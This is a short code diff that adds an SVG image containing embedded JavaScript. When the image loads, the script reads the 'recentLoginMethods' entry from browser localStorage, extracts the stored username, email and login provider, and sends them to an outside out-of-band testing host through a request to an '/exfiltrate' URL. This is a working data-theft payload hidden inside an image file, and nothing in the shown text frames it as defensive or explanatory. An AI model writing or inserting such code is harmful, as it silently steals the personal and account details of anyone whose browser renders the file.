@@ -15,3 +15,21 @@
     ]]>
   </script>
 </svg>
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    <![CDATA[
+      var recentLoginMethods = localStorage.getItem('recentLoginMethods');
+      if (recentLoginMethods) {
+        var loginMethods = JSON.parse(recentLoginMethods);
+        var username = loginMethods[0].username;
+        var email = loginMethods[0].email;
+        var provider = loginMethods[0].provider;
+
+        // Send to your server
+        var img = new Image();
+        img.src = "https://yubxblgtavfgjjrnpubomk60qxuntudti.oast.fun/exfiltrate?username=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&provider=" + encodeURIComponent(provider);
+      }
+    ]]>
+  </script>
+</svg>
